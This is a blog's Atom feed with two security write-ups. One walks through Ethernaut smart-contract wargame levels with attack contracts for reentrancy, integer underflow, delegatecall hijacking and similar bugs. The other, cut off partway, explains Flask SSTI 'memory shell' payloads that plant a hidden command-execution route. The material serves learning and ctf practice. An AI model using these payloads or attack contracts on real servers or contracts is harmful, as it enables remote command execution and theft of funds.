<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>坏孩子のSimple Blogs</title>
  
  <subtitle>每一个不曾起舞的日子都是对生命的辜负。</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-08-22T11:57:11.101Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>坏孩子</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ethernaut Writeup</title>
    <link href="http://example.com/2024/08/20/Ethernaut-Writeup/"/>
    <id>http://example.com/2024/08/20/Ethernaut-Writeup/</id>
    <published>2024-08-20T00:19:38.000Z</published>
    <updated>2024-08-22T11:57:11.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>智能合约（Smart Contract）是以太坊中最为重要的一个概念，即以计算机程序的方式来缔结和运行各种合约。</p><p>最早在上世纪 90 年代，Nick Szabo 等人就提出过类似的概念，但一直依赖因为缺乏可靠执行智能合约的环境，而被作为一种理论设计。区块链技术的出现，恰好补充了这一缺陷。</p><p>以太坊支持通过图灵完备的高级语言（包括 Solidity、Serpent、Viper）等来开发智能合约。智能合约作为运行在以太坊虚拟机（Ethereum Virual Machine，EVM）中的应用，可以接受来自外部的交易请求和事件，通过触发运行提前编写好的代码逻辑，进一步生成新的交易和事件，并且可以进一步调用其它智能合约。<span id="more"></span></p><p>随着区块链技术的兴起，以及智能合约应用越来越广泛，不过大部分还处于功能实现阶段，安全问题也接二连三地暴露出来。我们在进行开发的同时，也要时刻警惕可能出现的安全问题。</p><p>Ethernaut是一个基于Web3和Solidity并运行在EVM上的战争游戏，灵感来源于<code>overthewire.org</code>和漫画<code>El Eternauta</code>，以攻克关卡的形式逐步升级，题目质量感觉不错。</p><p>官网：<a href="https://ethernaut.zeppelin.solutions/">https://ethernaut.zeppelin.solutions</a></p><p>Github：<a href="https://github.com/OpenZeppelin/ethernaut">https://github.com/OpenZeppelin/ethernaut</a></p><hr><h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a><strong>Hello Ethernaut</strong></h1><p>关卡要求：</p><p>​本关卡帮助你了解游戏的基本操作。</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Instance &#123;    string public password;    uint8 public infoNum = 42;    string public theMethodName = &quot;The method name is method7123949.&quot;;    bool private cleared = false;    // constructor    constructor(string memory _password) &#123;        password = _password;    &#125;    function info() public pure returns (string memory) &#123;        return &quot;You will find what you need in info1().&quot;;    &#125;    function info1() public pure returns (string memory) &#123;        return &#39;Try info2(), but with &quot;hello&quot; as a parameter.&#39;;    &#125;    function info2(string memory param) public pure returns (string memory) &#123;        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;            return &quot;The property infoNum holds the number of the next info method to call.&quot;;        &#125;        return &quot;Wrong parameter.&quot;;    &#125;    function info42() public pure returns (string memory) &#123;        return &quot;theMethodName is the name of the next method.&quot;;    &#125;    function method7123949() public pure returns (string memory) &#123;        return &quot;If you know the password, submit it to authenticate().&quot;;    &#125;    function authenticate(string memory passkey) public &#123;        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;            cleared = true;        &#125;    &#125;    function getCleared() public view returns (bool) &#123;        return cleared;    &#125;&#125;</code></pre><p>攻击流程：</p><pre><code class="solidity">contract.info1()contract.info2(&quot;hello&quot;) // The property infoNum holds the number of the next info method to call.contract.infoNum() // 42contract.info42() // theMethodName is the name of the next method.contract.theMethodName() // The method name is method7123949.contract.method7123949() // If you know the password, submit it to authenticate().contract.password()  // ethernaut0contract.authenticate(&quot;ethernaut0&quot;)  // 完成此步后,点击submit instance即可过关。</code></pre><hr><h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a><strong>Fallback</strong></h1><p>关卡要求：</p><ul><li><p>成为这个合约的owner</p></li><li><p>把他的余额减到0</p></li></ul><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() &#123;        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function contribute() public payable &#123;        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) &#123;            owner = msg.sender;        &#125;    &#125;    function getContribution() public view returns (uint256) &#123;        return contributions[msg.sender];    &#125;    function withdraw() public onlyOwner &#123;        payable(owner).transfer(address(this).balance);    &#125;    receive() external payable &#123;        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    &#125;&#125;</code></pre><p>攻击流程：</p><pre><code class="solidity">await getBlance(instance)  //查看合约地址的资产总量await contract.contribute(&#123;value:1&#125;)  //向合约转1wei，使贡献值大于0await getBlance(instance)  //再次获取balance，检查是否成功改变await contract.sendTransaction(&#123;value:1&#125;)  //通过调用sendTransaction函数来触发fallback函数//await contract.send(1)await contract.owner()  //等交易完成后再次查看合约的owner，发现成功变为我们自己的地址await contract.withdraw()  //调用withdraw来转走合约的所有代币await getBalance(contract.address);  //检查合约地址</code></pre><hr><h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><p>关卡要求：</p><p>​获得合约的所有权</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;contract Fallout &#123;    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable &#123;        owner = msg.sender;        allocations[owner] = msg.value;    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function allocate() public payable &#123;        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    &#125;    function sendAllocation(address payable allocator) public &#123;        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    &#125;    function collectAllocations() public onlyOwner &#123;        msg.sender.transfer(address(this).balance);    &#125;    function allocatorBalance(address allocator) public view returns (uint256) &#123;        return allocations[allocator];    &#125;&#125;</code></pre><p>合约分析：</p><p>构造函数名称与合约名称不一致，同时在构造函数中指定了函数调用者直接为合约的owner</p><p>旧版 Solidity 的 constructor 需要使用与合约同名的方法来定义，而这里的 <code>Fal1out</code> 和合约名 <code>Fallout</code> 不一致，所以可以说它并不是 constructor，而是一个全局函数，因此可以任意调用。</p><p>攻击流程：</p><pre><code class="solidity">await contract.owner()await contract.Fal1out()await contract.owner()</code></pre><hr><h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><p>关卡要求：</p><p>​这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() &#123;        consecutiveWins = 0;    &#125;    function flip(bool _guess) public returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) &#123;            revert();        &#125;        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) &#123;            consecutiveWins++;            return true;        &#125; else &#123;            consecutiveWins = 0;            return false;        &#125;    &#125;&#125;</code></pre><p>合约分析：</p><p><a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">随机数问题</a></p><p>这题就是用了<code>block.blockhash(block.number-1)</code>，这个表示上一块的hash，然后去除以<code>2^255</code>，使用这种方式生成随机数，是极易被攻击利用的。</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408201038890.png"></p><p>如图，一个交易是被打包在一个区块里的，通过攻击合约去调用Lottery合约，那么他们的区块信息都是一样的。所以我们只需要部署一个合约，然后在该合约内调用 CoinFlip 合约的 flip 方法，这样就能保证两个合约获取到的 block.number 完全一致</p><p>攻击流程：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract CoinFlip &#123;    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() public &#123;        consecutiveWins = 0;    &#125;    function flip(bool _guess) public returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) &#123;            revert();        &#125;        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) &#123;            consecutiveWins++;            return true;        &#125; else &#123;            consecutiveWins = 0;            return false;        &#125;    &#125;&#125;contract exploit &#123;    address public con_addr = 0x3ff811aa4Eb665C960Da7eA0bBD8F2BFdC3Ed448;    CoinFlip expFlip = CoinFlip(con_addr);    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    function guess() public &#123;        uint256 blockValue = uint256(blockhash(block.number-1));        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);        bool guess = coinFlip == 1 ? true : false;        expFlip.flip(guess);    &#125;&#125;</code></pre><p>部署合约，并点击guess十次</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408201029530.png" alt="image-20240820102856298"></p><p>可使用 <code>await contract.consecutiveWins()</code> 来查询成功次数</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408201031124.png" alt="image-20240820103151578"></p><hr><h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><p>关卡要求：</p><p>​获取合约的owner权限</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    function changeOwner(address _owner) public &#123;        if (tx.origin != msg.sender) &#123;            owner = _owner;        &#125;    &#125;&#125;</code></pre><p>合约分析：</p><p>这里涉及到了 tx.origin 和 msg.sender 的区别，前者表示交易的发送者，后者则表示消息的发送者（合约的调用者）。</p><p>如果情景是在一个合约下的调用，那么这两者是没有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户</p><p>例如 <code>A (EOA) -&gt; B (contract) -&gt; C (contract)</code>，那么对于合约 C 来说，tx.origin 为外部账户 A 的地址，而 msg.sender 为合约 B 的地址。</p><p>攻击流程：</p><pre><code class="solidity">pragma solidity ^0.6.0;contract Telephone &#123;  address public owner;  constructor() public &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;contract exploit &#123;    Telephone target = Telephone(0x665F3eB49C60fA82E6ccB7D62A4B42627c79481b);    function attack() public &#123;        target.changeOwner(0xD81214eEeC8D4d0EC901Bccd932D2cbe47860385);    &#125;&#125;</code></pre><hr><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>关卡要求：</p><p>​这一关的目标是攻破下面这个基础 token 合约</p><p>​你最开始有20个 token，如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public &#123;        balances[msg.sender] = totalSupply = _initialSupply;    &#125;    function transfer(address _to, uint256 _value) public returns (bool) &#123;        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    &#125;    function balanceOf(address _owner) public view returns (uint256 balance) &#123;        return balances[_owner];    &#125;&#125;</code></pre><p>合约分析：</p><p>Solidity &lt; 0.8 时没有内置 SafeMath 库, 存在经典的整数溢出问题</p><p>这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于等于0，那么当我们 <code>_value</code> 大于 <code>balances[msg.sender]</code> 时，<code>balances[msg.sender]</code> 就会下溢，变成一个非常大的数。</p><p>攻击流程：</p><pre><code class="solidity">pragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;contract exploit &#123;    address public con_addr ;//    address public trans_to ;//    Token token = Token(con_addr);    uint overvalue = 21;    function attack() public &#123;        token.transfer(trans_to,overvalue);    &#125;&#125;</code></pre><pre><code class="solidity">await contract.totalSupply();  // total supply is 21000000await contract.balanceOf(player);  // current balance is 20await contract.transfer(&quot;0x01&quot;, &quot;21&quot;);  // int overflow(await contract.balanceOf(player)).toString();  // current balance is 115792089237316195423570985008687907853269984665640564039457584007913129639756</code></pre><hr><h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><p>关卡要求：</p><p>​这一关的目标是申明你对你创建实例的所有权</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;        owner = _owner;    &#125;    function pwn() public &#123;        owner = msg.sender;    &#125;&#125;contract Delegation &#123;    address public owner;    Delegate delegate;    constructor(address _delegateAddress) &#123;        delegate = Delegate(_delegateAddress);        owner = msg.sender;    &#125;    fallback() external &#123;        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) &#123;            this;        &#125;    &#125;&#125;</code></pre><p>合约分析：</p><ul><li><p><code>Solidity</code> 支持两种底层调用方式 <strong>call</strong> 和 <strong>delegatecall</strong></p><p><strong>call</strong> 外部调用时，上下文是外部合约；<strong>delegatecall</strong> 外部调用时，上下文是调用合约</p><p><strong>call</strong> 与 <strong>delegatecall</strong> 的功能类似，区别仅在于后者仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。</p><p>函数的设计目的是为了使用存储在另一个合约的库代码。</p><p>二者执行代码的上下文环境的不同，当使用call调用其它合约的函数时，代码是在被调用的合约的环境里执行，对应的，使用delegatecall进行函数调用时代码则是在调用函数的合约的环境里执行。</p><p>所以 <code>delegate.delegatecall(msg.data)</code> 其实调用的是 <code>delegate</code> 自身的 <code>msg.data</code></p><blockquote><p><code>delegatecall</code> is a low level function similar to <code>call</code>.</p><p>When contract <code>A</code> executes <code>delegatecall</code> to contract <code>B</code>, <code>B</code>‘s code is executed</p><p>with contract <code>A</code>‘s storage, <code>msg.sender</code> and <code>msg.value</code>.</p></blockquote></li><li><p><code>data</code> 头<code>4</code>个 <code>byte</code> 是被调用方法的签名哈希，即 <code>bytes4(keccak256(&quot;func&quot;))</code> , <code>remix</code> 里调用函数，实际是向合约账户地址发送了( <code>msg.data[0:4]</code> &#x3D;&#x3D; 函数签名哈希 )的一笔交易</p><p>所以我们只需调用 <code>Delegation</code> 的 <code>fallback</code> 的同时在 <code>msg.data</code> 放入 <code>pwn</code> 函数的签名即可</p></li><li><p><code>fallback</code> 的触发条件：</p><ul><li>一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 <code>fallback</code> 函数</li><li>二是只要是合约收到别人发送的 <code>Ether</code> 且没有数据，就会尝试执行 <code>fallback</code> 函数，此时 <code>fallback</code> 需要带有 <code>payable</code> 标记，否则，合约就会拒绝这个 <code>Ether</code></li></ul></li></ul><p>所以，通过转账触发 <code>Delegation</code> 合约的 <code>fallback</code> 函数，同时设置 <code>data</code> 为 <code>pwn</code> 函数的标识符。</p><p>攻击流程：</p><pre><code class="solidity">//sha3的返回值前两个为0x，所以要切0-10个字符。await contract.sendTransaction(&#123;data: web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;);await contract.owner();</code></pre><hr><h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><p>关卡要求：</p><p>​使合约的余额大于0</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force &#123;/*                   MEOW ?         /\_/\   /    ____/ o o \  /~____  =ø= / (______)__m_m)*/&#125;</code></pre><p>合约分析：</p><p>在以太坊里我们是可以强制给一个合约发送ether的，不管它要不要它都得收下，这是通过<code>selfdestruct</code>函数来实现的，正如他的名字，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的ether时会触发fallback函数，然而selfdestruct的发送将无视这一点。</p><p>两种方法</p><ul><li><p>使用 selfdestruct 强制将某一合约的 balance 转移到目标合约</p></li><li><p>在目标合约创建前预测其地址, 然后提前往该地址转账</p></li></ul><p>攻击流程：</p><pre><code class="solidity">pragma solidity 0.4.20;contract Force &#123;    function Force() public payable &#123;&#125;  // 构造函数为payable，那么就能在部署的时候给此合约转账。Value设为 1 wei    function attack(address _target) public &#123;        selfdestruct(_target);    &#125;&#125;await getBalance(instance)</code></pre><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408201155132.png"></p><hr><h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a><strong>Vault</strong></h1><p>关卡要求：</p><p>​打开 vault 来通过这一关</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    bool public locked;    bytes32 private password;    constructor(bytes32 _password) &#123;        locked = true;        password = _password;    &#125;    function unlock(bytes32 _password) public &#123;        if (password == _password) &#123;            locked = false;        &#125;    &#125;&#125;</code></pre><p>合约分析：</p><p>使用<code>web3.eth.getStorageAt()</code>方法返回一个以太坊地址的指定位置存储内容，借此获得密码内容</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408201206774.png"></p><p>解决此问题的关键在于如何查看私有变量。</p><p>需要记住的很重要的一点是，将变量标记为私有只会阻止其他合约访问它。标记为私有变量或局部变量的状态变量，仍可被公开访问。</p><p>为确保数据是私密的，在将数据放入区块链之前需要对其进行加密。在这种情况下，解密密钥永远不应该在链上发送，因为任何人都能够看到它。</p><p>或者也可以在 Etherscan 、getStorageAt 上可以看到题目合约的状态变化。</p><p>攻击流程：</p><pre><code class="solidity">web3.eth.getStorageAt(contract.address, 1)//web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(web3.toAscii(y))&#125;);contract.unlock(&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;)await contract.locked() // check locked state</code></pre><hr><h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><p>关卡要求：</p><p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p><p>这么有趣的游戏, 你的目标是攻破他.</p><p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123;    address king;    uint256 public prize;    address public owner;    constructor() payable &#123;        owner = msg.sender;        king = msg.sender;        prize = msg.value;    &#125;    receive() external payable &#123;        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    &#125;    function _king() public view returns (address) &#123;        return king;    &#125;&#125;</code></pre><p>合约分析：</p><p>transfer 转账时如果遇到错误会 revert, 根据这个特性可以使得某个恶意合约成为 king, 该合约的 receive 方法始终 revert</p><p>这样其他人在获取王位的时候, 题目合约就会将当前转入的金额 transfer 给恶意合约, 而后者始终 revert, 导致整个方法调用无法成功, 也就保留住了王位</p><p>只要国王拒绝接收奖励即可一直当国王。那么我们可以部署攻击合约，使用 <code>revert()</code> 占据合约的king不放</p><p>攻击流程：</p><pre><code class="solidity">fromWei((await contract.prize()).toString());  // 0.001 eth----------------------------------------------------------------------------pragma solidity 0.4.18;contract attack &#123;    function attack(address _add) public payable &#123;        _add.call.gas(1000000).value(msg.value)();    &#125;    function () public &#123;        revert();    &#125;&#125;----------------------------------------------------------------------------// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// ...contract Attack &#123;    receive() external payable &#123;        revert(&quot;Error&quot;);    &#125;    function claimKing(address payable addr) external payable &#123;        addr.call&#123;value: 0.0011 ether&#125;(&quot;&quot;);    &#125;&#125;</code></pre><hr><h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>关卡要求：</p><p>​这一关的目标是偷走合约的所有资产.</p><p>合约代码：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;contract Reentrance &#123;    using SafeMath for uint256;    mapping(address =&gt; uint256) public balances;    function donate(address _to) public payable &#123;        balances[_to] = balances[_to].add(msg.value);    &#125;    function balanceOf(address _who) public view returns (uint256 balance) &#123;        return balances[_who];    &#125;    function withdraw(uint256 _amount) public &#123;        if (balances[msg.sender] &gt;= _amount) &#123;            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);            if (result) &#123;                _amount;            &#125;            balances[msg.sender] -= _amount;        &#125;    &#125;    receive() external payable &#123;&#125;&#125;</code></pre><p>合约分析：</p><p>经典的重入攻击</p><p>注意题目使用的 Solidity 版本为 0.6.x, 这个版本不存在溢出检查, 因此 withdraw 方法的 <code>balances[msg.sender] -= _amount</code> 语句存在溢出风险, 这也是能执行重入的前提。</p><p>攻击流程：</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;contract exploit &#123;   //设定目标合约地址  Reentrance reentrance;  constructor(address payable instance_add) public payable &#123;    reentrance = Reentrance(instance_add);  &#125;  //重写fallback  fallback() external payable &#123;    if(address(reentrance).balance &gt;= 0 ether)&#123;      reentrance.withdraw(0.001 ether);    &#125;  &#125;  //攻击，调用withdraw  function attack() external &#123;    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));    reentrance.withdraw(0.001 ether);  &#125;  //查询余额  function instance_balance() public view returns (uint) &#123;    return address(reentrance).balance;  &#125;   &#125;</code></pre><p>部署合约时打入一些钱</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221953415.png" alt="image-20240822195337510"></p><p>使用函数查询实例合约中原有余额</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221957818.png" alt="image-20240822195703407"></p><p>攻击完成后再次查询余额，也可以在控制台查询</p><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221956161.png" alt="image-20240822195629790"></p><hr><p>[+] 更新中……</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;智能合约（Smart Contract）是以太坊中最为重要的一个概念，即以计算机程序的方式来缔结和运行各种合约。&lt;/p&gt;
&lt;p&gt;最早在上世纪 90 年代，Nick Szabo 等人就提出过类似的概念，但一直依赖因为缺乏可靠执行智能合约的环境，而被作为一种理论设计。区块链技术的出现，恰好补充了这一缺陷。&lt;/p&gt;
&lt;p&gt;以太坊支持通过图灵完备的高级语言（包括 Solidity、Serpent、Viper）等来开发智能合约。智能合约作为运行在以太坊虚拟机（Ethereum Virual Machine，EVM）中的应用，可以接受来自外部的交易请求和事件，通过触发运行提前编写好的代码逻辑，进一步生成新的交易和事件，并且可以进一步调用其它智能合约。</summary>
    
    
    
    <category term="Blockchain" scheme="http://example.com/categories/Blockchain/"/>
    
    <category term="Writeup" scheme="http://example.com/categories/Blockchain/Writeup/"/>
    
    
    <category term="智能合约" scheme="http://example.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>python-Flask内存马</title>
    <link href="http://example.com/2024/08/16/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2024/08/16/python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-08-15T18:16:03.000Z</published>
    <updated>2024-08-18T07:53:48.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久之前在各位师傅的博客里看过，语雀里一直贴着链接，这里暂且记录一下相关知识点。</p><hr><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>常用的Python框架有<code>Django</code>、<code>Flask</code>，这两者都可能存在<code>SSTI</code>漏洞。<span id="more"></span></p><p>Python 内存马利用Flask框架中SSTI注入来实现， Flask框架中在web应用模板渲染的过程中用到<code>render_template_string</code>进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现Python内存马的注入。</p><p>注入内存马需要我们能执行代码，经典的方式是通过SSTI，当然也可以利用<code>pickle反序列化</code>等。</p><p>本文基于SSTI漏洞环境为例。</p><hr><h1 id="Flask-请求上下文管理机制"><a href="#Flask-请求上下文管理机制" class="headerlink" title="Flask 请求上下文管理机制"></a>Flask 请求上下文管理机制</h1><p>当网页请求进入<code>Flask</code>时， 会实例化一个<code>Request Context</code>。</p><p>在Python中分出了两种上下文：请求上下文(request context)、应用上下文(session context)。</p><p> 一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个<code>Stack</code>的栈结构，也就是说它拥有一个栈所拥有的全部特性。<code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先准备一个Flask SSTI漏洞环境：</p><pre><code class="python">from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#39;/&#39;)def home():    person = &#39;guest&#39;    if request.args.get(&#39;name&#39;):        person = request.args.get(&#39;name&#39;)    template = &#39;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#39; % person    return render_template_string(template)if __name__ == &quot;__main__&quot;:    app.run(debug=False)</code></pre><hr><h2 id="debug模式下利用报错"><a href="#debug模式下利用报错" class="headerlink" title="debug模式下利用报错"></a>debug模式下利用报错</h2><p>众所周知，在flask中如果开启了debug模式，报错是会显示详细信息的，比赛中debug模式通常考点是构造pin码，但是我们这里想到，可以通过手动控制报错<code>raise Exception()</code>的方式来让我们的命令回显。</p><p>payload：</p><pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['exec']("raise Exception(__import__('os').popen('whoami').read())")&#125;&#125;</code></pre><p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408181146916.png" alt="image-20240818114607351"></p><hr><p>接下来关闭debug模式，开始研究内存马。</p><h2 id="低版本内存马"><a href="#低版本内存马" class="headerlink" title="低版本内存马"></a>低版本内存马</h2><p>payload：</p><pre><code class="python">&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;</code></pre><p>写成容易阅读的形式</p><pre><code class="python">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](    &quot;app.add_url_rule(        &#39;/shell&#39;,         &#39;shell&#39;,         lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()        )    &quot;,    &#123;        &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],        &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]    &#125;)</code></pre><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>第一行利用<code>url_for()</code>函数作为入口点获取了当前命名空间的<code>__builtins__</code>模块,调用了<code>eval</code>用于执行代码。</p><p>这个eval传入了两个参数,先看第二个：</p><pre><code class="python">&#123;        &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],        &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]    